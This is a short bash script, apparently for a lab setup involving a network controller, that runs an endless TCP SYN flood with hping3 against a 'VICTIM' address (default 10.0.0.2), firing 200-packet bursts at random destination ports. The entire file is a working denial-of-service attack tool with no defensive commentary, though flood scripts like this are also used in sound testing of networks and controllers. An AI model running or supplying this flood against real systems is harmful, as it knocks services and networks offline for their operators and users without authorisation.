#!/usr/bin/env bash
set -euo pipefail

VICTIM="${1:-10.0.0.2}"

echo "[+] New-flow flood against ${VICTIM} (TCP SYN to random dst ports)"
echo "    Stop with Ctrl+C"

# Increase intensity: many unique dst ports quickly
while true; do
  # 200 SYNs burst
  for i in $(seq 1 200); do
    PORT=$(( (RANDOM % 30000) + 1000 ))
    hping3 -S -c 1 -p "$PORT" "$VICTIM" >/dev/null 2>&1 &
  done
  # small pause to let controller process
  sleep 0.1
done
